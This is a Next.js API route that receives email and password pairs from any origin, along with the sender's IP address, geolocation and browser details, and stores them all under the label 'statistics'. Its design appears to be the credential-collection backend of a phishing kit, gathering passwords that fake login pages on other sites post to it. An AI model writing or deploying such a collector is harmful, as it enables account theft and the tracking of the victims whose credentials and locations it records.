import { geolocation } from '@vercel/functions';
import { NextRequest, NextResponse } from 'next/server';
import { UAParser } from 'ua-parser-js';

// import type { NextRequest } from 'next/server';
import { saveStatistics } from '@/core/features/statistics/actions';
import { APIResponseData, APIResult } from '@/core/types';

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 200,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}

export async function POST(
  request: NextRequest
): Promise<NextResponse<APIResult<APIResponseData>>> {
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
  };

  const body = await request.json();
  const { appId, email, password } = body;

  if (!email || !password) {
    return NextResponse.json(
      {
        data: null,
        error: 'Check credentials in request body',
      },
      { headers: corsHeaders }
    );
  }

  const noData = '—';

  const gl = geolocation(request);
  const forwardedFor = request.headers.get('x-forwarded-for');
  const ip = forwardedFor?.split(',')[0]?.trim() || noData;
  const userAgent = request.headers.get('user-agent') || '';
  const parser = new UAParser(userAgent);
  const result = parser.getResult();

  const geo = {
    city: gl?.city || noData,
    country: gl?.country || noData,
    flag: gl?.flag || noData,
    latitude: gl?.latitude || noData,
    longitude: gl?.longitude || noData,
    // postalCode: gl?.city || noData,
  };
  const system = {
    browser: result?.browser?.name || noData,
    // browserVersion: result?.browser?.major || noData,
    os: result?.os?.name || noData,
    osVersion: result?.os?.version || noData,
    // cpuArch: result?.cpu?.architecture || noData,
  };

  try {
    // Save statistics in db
    const res = await saveStatistics({
      appId,
      credentials: { email, password },
      geo,
      ip,
      system,
    });
    if (res?.success) {
      return NextResponse.json(
        {
          data: {
            success: true,
            message: 'Statistics saved in db',
          },
        },
        { headers: corsHeaders }
      );
    } else {
      return NextResponse.json(
        {
          data: null,
          error: `Unable to save statistics`,
        },
        { headers: corsHeaders }
      );
    }
  } catch (err: unknown) {
    console.error(`POST api/<v>/statistics ${err}`);
    return NextResponse.json(
      {
        data: null,
        error: `Unable to save statistics.`,
      },
      { headers: corsHeaders }
    );
  }
}
